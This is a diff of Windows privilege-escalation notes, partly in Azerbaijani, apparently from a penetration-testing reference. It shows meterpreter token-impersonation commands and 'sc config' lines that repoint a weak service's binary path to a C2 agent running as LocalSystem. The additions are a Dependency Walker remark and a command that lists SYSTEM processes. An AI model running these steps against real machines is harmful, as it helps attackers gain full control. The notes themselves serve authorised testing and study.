@@ -12,6 +12,7 @@ sistemdə mümkün olan bütün açıqlıqları detallıca gətirir və bizə t�
 `list_tokens -u`[meterpreter] ilə daha yüksək imtiyazlı istifadəçiləri token ilə təqlid edə bilib bilməyəcəyini göstərir.
 Əgər belə bir imtiyaz olarsa onda `impersonate_token "NT_AUTHORİTY\SYSTEM"` yazaraq o imtiyaza sahib olacaq.
 
+PS: Dependency Walker showing full DLL paths.
 
 ## cmd commands
 
@@ -48,3 +49,8 @@ Services can be queried individually or in a batch to determine their access con
 Any logged-in user can modify parameters for the VulnService service. To achieve this:  
 `sc config VulnPath binpath="C:\temp\c2agent.exe"`  
 `sc config VulnPath obj= ".\LocalSystem" password= ""`  
+
+To find all processes currently running as SYSTEM, use the following command:  
+`tasklist.exe /FI "username eq system" /v`
+
+
